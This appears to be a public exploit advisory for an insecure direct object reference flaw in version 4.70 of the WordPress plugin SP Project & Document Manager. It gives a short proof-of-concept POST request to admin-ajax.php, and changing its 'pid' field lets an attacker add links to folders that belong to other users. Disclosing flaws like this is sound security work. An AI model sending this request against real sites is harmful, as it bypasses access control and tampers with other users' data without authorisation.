# Exploit Title: SP Project & Document Manager v4.70 - Insecure Direct Object Reference(IDOR)
## Date: 2/20/2024
## Vendor Homepage: https://cn.wordpress.org/plugins/sp-client-document-manager/
## Tested on: Debian Linux, Apache, Mysql
## Vendor: SP Project & Document Manager
## Version: v4.70
## Exploit Description:
## SP Project & Document Manager v4.70 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to add link in folder that is assigned to other user(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /wp-admin/admin-ajax.php HTTP/1.1
...

pid=2(CHANGE HERE)&action=sp_cdm_link_save_embed&uid=2&link-name=link1&link-url=http%3A%2F%2Flocalhost%3A8020%2Flink1&dlg-upload-notes=aaa
```
